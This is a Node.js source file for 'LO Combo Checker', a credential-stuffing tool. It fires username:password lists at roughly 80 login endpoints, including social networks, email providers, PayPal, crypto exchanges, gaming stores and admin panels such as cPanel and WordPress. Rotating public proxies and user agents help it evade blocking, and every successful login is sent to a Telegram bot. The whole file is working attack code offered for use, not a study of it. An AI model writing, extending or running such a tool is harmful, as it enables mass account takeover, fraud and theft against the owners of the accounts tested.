const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const path = require('path');
const axios = require('axios');
const cheerio = require('cheerio');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Config
const PORT = process.env.PORT || 3000;
const CONCURRENT = 500;
const TIMEOUT = 15000;

// State
let proxyPool = [];
let stats = { checked: 0, valid: 0, invalid: 0, errors: 0 };
let telegramConfig = { botToken: '', chatId: '' };
let isRunning = false;

// Services
const SERVICES = {
  facebook: { name: 'Facebook', cat: 'Social', color: '#1877F2', url: 'https://www.facebook.com/login.php', fields: ['email','pass'] },
  instagram: { name: 'Instagram', cat: 'Social', color: '#E4405F', url: 'https://www.instagram.com/accounts/login/ajax/', fields: ['username','password'] },
  twitter: { name: 'Twitter/X', cat: 'Social', color: '#000', url: 'https://api.twitter.com/1.1/onboarding/task.json', fields: ['username','password'] },
  tiktok: { name: 'TikTok', cat: 'Social', color: '#000', url: 'https://www.tiktok.com/passport/web/login', fields: ['username','password'] },
  youtube: { name: 'YouTube', cat: 'Social', color: '#FF0000', url: 'https://accounts.google.com/signin/v2/identifier', fields: ['email','pass'] },
  reddit: { name: 'Reddit', cat: 'Social', color: '#FF4500', url: 'https://www.reddit.com/api/login', fields: ['user','passwd'] },
  linkedin: { name: 'LinkedIn', cat: 'Social', color: '#0A66C2', url: 'https://www.linkedin.com/checkpoint/lg/login-submit', fields: ['session_key','session_password'] },
  twitch: { name: 'Twitch', cat: 'Social', color: '#9146FF', url: 'https://passport.twitch.tv/login', fields: ['username','password'] },
  kick: { name: 'Kick', cat: 'Social', color: '#53FC18', url: 'https://kick.com/api/v2/signin', fields: ['email','password'] },
  trustpilot: { name: 'Trustpilot', cat: 'Social', color: '#00B67A', url: 'https://login.trustpilot.com', fields: ['username','password'] },
  fb_ads: { name: 'FB Ads', cat: 'Ads', color: '#1877F2', url: 'https://business.facebook.com/login', fields: ['email','pass'] },
  tt_ads: { name: 'TT Ads', cat: 'Ads', color: '#000', url: 'https://ads.tiktok.com/i18n/login', fields: ['email','password'] },
  tw_ads: { name: 'TW Ads', cat: 'Ads', color: '#000', url: 'https://ads.twitter.com/login', fields: ['username','password'] },
  gmail: { name: 'Google', cat: 'Email', color: '#4285F4', url: 'https://accounts.google.com/signin/v2/identifier', fields: ['email','pass'] },
  gkeep: { name: 'G.Keep', cat: 'Email', color: '#FFBB00', url: 'https://accounts.google.com/signin/v2/identifier', fields: ['email','pass'] },
  gpay: { name: 'G.Pay', cat: 'Email', color: '#4285F4', url: 'https://accounts.google.com/signin/v2/identifier', fields: ['email','pass'] },
  outlook: { name: 'Outlook', cat: 'Email', color: '#0078D4', url: 'https://login.live.com/login.srf', fields: ['login','passwd'] },
  yahoo: { name: 'Yahoo', cat: 'Email', color: '#6001D2', url: 'https://login.yahoo.com', fields: ['username','password'] },
  aol: { name: 'AOL', cat: 'Email', color: '#FFBE00', url: 'https://login.aol.com', fields: ['username','password'] },
  icloud: { name: 'iCloud', cat: 'Email', color: '#000', url: 'https://idmsa.apple.com/appleauth/auth/signin', fields: ['accountName','password'] },
  mailru: { name: 'Mail.ru', cat: 'Email', color: '#005FF9', url: 'https://auth.mail.ru/cgi-bin/auth', fields: ['Login','Password'] },
  yandex: { name: 'Yandex', cat: 'Email', color: '#FC3F1D', url: 'https://passport.yandex.ru/auth', fields: ['login','passwd'] },
  rambler: { name: 'Rambler', cat: 'Email', color: '#315EFB', url: 'https://id.rambler.ru/login', fields: ['login','password'] },
  seznam: { name: 'Seznam', cat: 'Email', color: '#D71A21', url: 'https://login.szn.cz', fields: ['username','password'] },
  onet: { name: 'ONet', cat: 'Email', color: '#E41E13', url: 'https://konto.onet.pl/signin', fields: ['login','password'] },
  wp_pl: { name: 'WP.pl', cat: 'Email', color: '#21759B', url: 'https://profil.wp.pl/login.html', fields: ['login_username','password'] },
  amazon: { name: 'Amazon', cat: 'Shopping', color: '#FF9900', url: 'https://www.amazon.com/ap/signin', fields: ['email','password'] },
  ebay: { name: 'eBay', cat: 'Shopping', color: '#E53238', url: 'https://signin.ebay.com/ws/eBayISAPI.dll', fields: ['userid','pass'] },
  walmart: { name: 'Walmart', cat: 'Shopping', color: '#0071CE', url: 'https://www.walmart.com/account/login', fields: ['email','password'] },
  booking: { name: 'Booking', cat: 'Shopping', color: '#003580', url: 'https://account.booking.com/sign-in', fields: ['username','password'] },
  vinted: { name: 'Vinted', cat: 'Shopping', color: '#007782', url: 'https://www.vinted.com/auth/login', fields: ['email','password'] },
  kleinanzeigen: { name: 'Kleinanz.', cat: 'Shopping', color: '#E60023', url: 'https://www.kleinanzeigen.de/m-einloggen.html', fields: ['emailOrUsername','password'] },
  wallapop: { name: 'Wallapop', cat: 'Shopping', color: '#13C1AC', url: 'https://es.wallapop.com/login', fields: ['email','password'] },
  shopify: { name: 'Shopify', cat: 'Shopping', color: '#96BF48', url: 'https://accounts.shopify.com/store-login', fields: ['login','password'] },
  funpay: { name: 'FunPay', cat: 'Shopping', color: '#FF8C00', url: 'https://funpay.com/en/account/login', fields: ['email','password'] },
  loaded: { name: 'Loaded', cat: 'Shopping', color: '#6366F1', url: 'https://loaded.nl/login', fields: ['email','password'] },
  paypal: { name: 'PayPal', cat: 'Finance / Crypto', color: '#003087', url: 'https://www.paypal.com/signin', fields: ['login_email','login_password'] },
  coinbase: { name: 'Coinbase', cat: 'Finance / Crypto', color: '#0052FF', url: 'https://www.coinbase.com/signin', fields: ['email','password'] },
  binance: { name: 'Binance', cat: 'Finance / Crypto', color: '#F0B90B', url: 'https://www.binance.com/en/login', fields: ['email','password'] },
  bybit: { name: 'Bybit', cat: 'Finance / Crypto', color: '#F7A600', url: 'https://www.bybit.com/en-US/login', fields: ['email','password'] },
  mexc: { name: 'MEXC', cat: 'Finance / Crypto', color: '#1E3A8A', url: 'https://www.mexc.com/login', fields: ['email','password'] },
  freebitcoin: { name: 'Freebitco.in', cat: 'Finance / Crypto', color: '#F7931A', url: 'https://freebitco.in/', fields: ['email','password'] },
  spotify: { name: 'Spotify', cat: 'Streaming', color: '#1DB954', url: 'https://accounts.spotify.com/en/login', fields: ['username','password'] },
  netflix: { name: 'Netflix', cat: 'Streaming', color: '#E50914', url: 'https://www.netflix.com/login', fields: ['userLoginId','password'] },
  dropbox: { name: 'Dropbox', cat: 'Streaming', color: '#0061FF', url: 'https://www.dropbox.com/login', fields: ['login_email','login_password'] },
  humblebundle: { name: 'HumbleBundle', cat: 'Streaming', color: '#CC2229', url: 'https://www.humblebundle.com/login', fields: ['username','password'] },
  steam: { name: 'Steam', cat: 'Gaming', color: '#66C0F4', url: 'https://store.steampowered.com/login', fields: ['username','password'] },
  epic: { name: 'Epic', cat: 'Gaming', color: '#fff', url: 'https://www.epicgames.com/id/login/epic', fields: ['email','password'] },
  fortnite: { name: 'Fortnite', cat: 'Gaming', color: '#9D4DBB', url: 'https://www.epicgames.com/id/login/epic', fields: ['email','password'] },
  roblox: { name: 'Roblox', cat: 'Gaming', color: '#000', url: 'https://auth.roblox.com/v2/login', fields: ['username','password'] },
  minecraft: { name: 'Minecraft', cat: 'Gaming', color: '#62B47A', url: 'https://login.live.com/login.srf', fields: ['login','passwd'] },
  gog: { name: 'GOG', cat: 'Gaming', color: '#86328A', url: 'https://login.gog.com/login', fields: ['login','password'] },
  hoyolab: { name: 'HoYoLab', cat: 'Gaming', color: '#4A90D9', url: 'https://account.hoyoverse.com', fields: ['account','password'] },
  supercell: { name: 'Supercell', cat: 'Gaming', color: '#000', url: 'https://supercell.com', fields: ['email','password'] },
  nintendo: { name: 'Nintendo', cat: 'Gaming', color: '#E60012', url: 'https://accounts.nintendo.com/login', fields: ['email','password'] },
  ea: { name: 'EA', cat: 'Gaming', color: '#FF4747', url: 'https://accounts.ea.com', fields: ['email','password'] },
  exitlag: { name: 'ExitLag', cat: 'Gaming', color: '#00D4FF', url: 'https://www.exitlag.com/login', fields: ['email','password'] },
  eft: { name: 'EFT', cat: 'Gaming', color: '#C9A227', url: 'https://www.escapefromtarkov.com', fields: ['email','password'] },
  battlenet: { name: 'Battle.net', cat: 'Gaming', color: '#0074E0', url: 'https://us.battle.net/login/en/', fields: ['accountName','password'] },
  wordpress: { name: 'WordPress', cat: 'Logs', color: '#21759B', url: '/wp-login.php', fields: ['log','pwd'] },
  joomla: { name: 'Joomla', cat: 'Logs', color: '#5091CD', url: '/administrator', fields: ['username','passwd'] },
  opencart: { name: 'OpenCart', cat: 'Logs', color: '#00B4D8', url: '/admin', fields: ['username','password'] },
  magento: { name: 'Magento', cat: 'Logs', color: '#F26322', url: '/admin', fields: ['login[username]','login[password]'] },
  prestashop: { name: 'PrestaShop', cat: 'Logs', color: '#DF0067', url: '/admin', fields: ['email','passwd'] },
  cpanel: { name: 'cPanel', cat: 'Logs', color: '#FF6C2C', url: '/login', fields: ['user','pass'] },
  whm: { name: 'WHM', cat: 'Logs', color: '#FF6C2C', url: '/login', fields: ['user','pass'] },
  plesk: { name: 'Plesk', cat: 'Logs', color: '#52B2E9', url: '/login_up.php', fields: ['login_name','passwd'] },
  phpmyadmin: { name: 'phpMyAdmin', cat: 'Logs', color: '#F89C0E', url: '/index.php', fields: ['pma_username','pma_password'] },
  gitlab: { name: 'GitLab', cat: 'Logs', color: '#FC6D26', url: '/users/sign_in', fields: ['user[login]','user[password]'] },
  spambot: { name: 'SpamBot', cat: 'Telegram', color: '#0088CC', url: 'https://t.me/SpamBot', fields: ['token'] },
  cryptobot: { name: 'CryptoBot', cat: 'Telegram', color: '#0088CC', url: 'https://t.me/CryptoBot', fields: ['token'] },
  wallet: { name: 'Wallet', cat: 'Telegram', color: '#0088CC', url: 'https://t.me/wallet', fields: ['token'] },
  xrocket: { name: 'xRocket', cat: 'Telegram', color: '#0088CC', url: 'https://t.me/xrocket', fields: ['token'] },
  tonnel: { name: 'Tonnel', cat: 'Telegram', color: '#0088CC', url: 'https://t.me/tonnel', fields: ['token'] },
  portals: { name: 'Portals', cat: 'Telegram', color: '#0088CC', url: 'https://t.me/portals', fields: ['token'] },
  skyusdt: { name: 'Sky USDT', cat: 'Telegram', color: '#0088CC', url: 'https://t.me/skyusdt', fields: ['token'] },
  cashinout: { name: 'Cashinout', cat: 'Telegram', color: '#0088CC', url: 'https://t.me/cashinout', fields: ['token'] },
  swapster: { name: 'Swapster', cat: 'Telegram', color: '#0088CC', url: 'https://t.me/swapster', fields: ['token'] },
  baksmany: { name: 'Baksmany', cat: 'Telegram', color: '#0088CC', url: 'https://t.me/baksmany', fields: ['token'] }
};

// Proxy Manager
class ProxyManager {
  constructor() { this.proxies = []; this.working = []; this.idx = 0; }
  async fetch() {
    const sources = [
      'https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
      'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
      'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
    ];
    const fetched = [];
    for (const src of sources) {
      try {
        const r = await axios.get(src, { timeout: 10000 });
        r.data.split('\n').forEach(line => {
          const t = line.trim();
          if (t && t.includes(':')) {
            const [h, p] = t.split(':');
            if (h && p && !isNaN(parseInt(p))) fetched.push({ host: h.trim(), port: parseInt(p.trim()) });
          }
        });
      } catch(e) {}
    }
    this.proxies = [...new Set(fetched.map(p => `${p.host}:${p.port}`))].map(s => {
      const [h, p] = s.split(':'); return { host: h, port: parseInt(p) };
    });
    console.log(`[Proxy] ${this.proxies.length} proxies fetched`);
    return this.proxies.length;
  }
  getAgent() {
    if (this.proxies.length === 0) return null;
    const p = this.proxies[this.idx % this.proxies.length]; this.idx++;
    return new HttpsProxyAgent(`http://${p.host}:${p.port}`);
  }
}
const proxyManager = new ProxyManager();

// User Agent rotation
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0'
];

function getHeaders() {
  return {
    'user-agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'accept-encoding': 'gzip, deflate, br',
    'cache-control': 'max-age=0',
    'upgrade-insecure-requests': '1'
  };
}

// Semaphore
class Semaphore {
  constructor(max) { this.max = max; this.count = 0; this.queue = []; }
  acquire() { return new Promise(r => { if (this.count < this.max) { this.count++; r(); } else this.queue.push(r); }); }
  release() { if (this.queue.length > 0) { const n = this.queue.shift(); n(); } else this.count--; }
}

// Checker Engine
class CheckerEngine {
  constructor() { this.clients = new Set(); this.results = []; this.stats = { checked: 0, valid: 0, invalid: 0, errors: 0 }; this.isRunning = false; this.startTime = null; }
  addClient(ws) { this.clients.add(ws); }
  removeClient(ws) { this.clients.delete(ws); }
  broadcast(data) { const msg = JSON.stringify(data); this.clients.forEach(c => { if (c.readyState === 1) c.send(msg); }); }

  async start(config) {
    const services = config.services || [];
    const combos = config.combos || [];
    if (services.length === 0 || combos.length === 0) { this.broadcast({ type: 'error', message: 'No services or combos' }); return; }
    this.isRunning = true; this.startTime = Date.now(); this.stats = { checked: 0, valid: 0, invalid: 0, errors: 0 }; this.results = [];
    this.broadcast({ type: 'status', status: 'running', total: combos.length * services.length, services });
    if (config.useProxy && proxyManager.proxies.length === 0) await proxyManager.fetch();
    const sem = new Semaphore(config.concurrent || CONCURRENT);
    const promises = [];
    for (const combo of combos) {
      for (const svcKey of services) {
        const svc = SERVICES[svcKey]; if (!svc) continue;
        promises.push(sem.acquire().then(async () => {
          if (!this.isRunning) { sem.release(); return; }
          try { const r = await this.check(combo, svcKey, svc, config.useProxy); this.process(r); }
          catch(e) { this.process({ combo, service: svcKey, serviceName: svc.name, category: svc.cat, status: 'error', message: e.message }); }
          finally { sem.release(); }
        }));
      }
    }
    await Promise.all(promises);
    this.isRunning = false;
    this.broadcast({ type: 'status', status: 'completed', stats: this.stats, duration: Date.now() - this.startTime });
  }

  async check(combo, svcKey, svc, useProxy) {
    const [user, pass] = combo.split(':'); if (!user || !pass) return { combo, service: svcKey, serviceName: svc.name, category: svc.cat, status: 'error', message: 'Invalid format' };
    const headers = getHeaders();
    const agent = useProxy ? proxyManager.getAgent() : null;
    const form = new URLSearchParams(); form.append(svc.fields[0], user); form.append(svc.fields[1], pass);
    try {
      const r = await axios.post(svc.url, form.toString(), { headers, httpsAgent: agent, httpAgent: agent, timeout: TIMEOUT, maxRedirects: 5, validateStatus: () => true });
      const body = r.data; const code = r.status;
      if (code === 200) {
        if (typeof body === 'string') {
          if (body.includes('incorrect') || body.includes('Invalid') || body.includes('error') || body.includes('wrong') || body.includes('failed') || body.includes('denied')) return { status: 'invalid', message: 'Invalid credentials' };
          if (body.includes('dashboard') || body.includes('welcome') || body.includes('success') || body.includes('home') || body.includes('profile')) return { status: 'valid', message: 'Login successful' };
        }
        if (body.authenticated || body.success || body.logged_in || body.token) return { status: 'valid', message: 'Login successful' };
      }
      if (code === 302 || code === 301) {
        const loc = r.headers.location || '';
        if (!loc.includes('login') && !loc.includes('error') && !loc.includes('fail')) return { status: 'valid', message: 'Redirect to dashboard' };
      }
      return { status: 'invalid', message: `Status: ${code}` };
    } catch(e) { return { status: 'error', message: e.message }; }
  }

  process(result) {
    this.stats.checked++;
    if (result.status === 'valid') { this.stats.valid++; this.results.push(result); this.sendTg(result); }
    else if (result.status === 'invalid') this.stats.invalid++;
    else this.stats.errors++;
    const elapsed = (Date.now() - this.startTime) / 60000;
    const cpm = elapsed > 0 ? Math.round(this.stats.checked / elapsed) : 0;
    this.broadcast({ type: 'result', result, stats: { ...this.stats, cpm } });
  }

  async sendTg(result) {
    if (!telegramConfig.botToken || !telegramConfig.chatId) return;
    const msg = `✅ <b>HIT</b>\n\n📱 <b>Service:</b> ${result.serviceName}\n👤 <b>Combo:</b> <code>${result.combo}</code>\n📝 <b>Status:</b> ${result.status.toUpperCase()}\n💬 <b>Info:</b> ${result.message}\n\n⏰ ${new Date().toLocaleString()}`;
    try { await axios.post(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, { chat_id: telegramConfig.chatId, text: msg, parse_mode: 'HTML' }); }
    catch(e) { console.error('[TG] Failed:', e.message); }
  }

  stop() { this.isRunning = false; this.broadcast({ type: 'status', status: 'stopped' }); }
}

const engine = new CheckerEngine();

// WebSocket
wss.on('connection', (ws) => {
  console.log('[WS] Client connected');
  engine.addClient(ws);
  ws.send(JSON.stringify({ type: 'connected', services: Object.entries(SERVICES).map(([k,v]) => ({ key: k, ...v })), stats: engine.stats, isRunning: engine.isRunning }));
  ws.on('message', async (data) => {
    try {
      const msg = JSON.parse(data);
      switch(msg.type) {
        case 'start': if (!engine.isRunning) await engine.start(msg.config); break;
        case 'stop': engine.stop(); break;
        case 'config': telegramConfig = msg.telegram || telegramConfig; ws.send(JSON.stringify({ type: 'config_saved' })); break;
        case 'get_stats': ws.send(JSON.stringify({ type: 'stats', stats: engine.stats, isRunning: engine.isRunning })); break;
        case 'export': ws.send(JSON.stringify({ type: 'export', data: engine.results.filter(r => r.status === 'valid'), format: msg.format || 'json' })); break;
        case 'refresh_proxies': const c = await proxyManager.fetch(); ws.send(JSON.stringify({ type: 'proxies_refreshed', count: c })); break;
      }
    } catch(e) { ws.send(JSON.stringify({ type: 'error', message: e.message })); }
  });
  ws.on('close', () => { console.log('[WS] Client disconnected'); engine.removeClient(ws); });
});

// Express
app.use(express.static(path.join(__dirname)));
app.use(express.json({ limit: '50mb' }));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/api/services', (req, res) => res.json(Object.entries(SERVICES).map(([k,v]) => ({ key: k, ...v }))));
app.get('/api/stats', (req, res) => res.json({ stats: engine.stats, isRunning: engine.isRunning, proxyCount: proxyManager.proxies.length }));
app.post('/api/config', (req, res) => { telegramConfig = req.body.telegram || telegramConfig; res.json({ success: true }); });

// Start
async function init() {
  console.log('\n╔═══════════════════════════════════════════════════════════════╗');
  console.log('║  LO COMBO CHECKER v2.0 - Starting...                        ║');
  console.log('║  Built with love by ENI for LO                              ║');
  console.log('╚═══════════════════════════════════════════════════════════════╝\n');
  await proxyManager.fetch();
  server.listen(PORT, () => {
    console.log(`[Server] http://localhost:${PORT}`);
    console.log(`[Services] ${Object.keys(SERVICES).length} loaded`);
    console.log(`[Proxies] ${proxyManager.proxies.length} available`);
  });
}
init().catch(console.error);
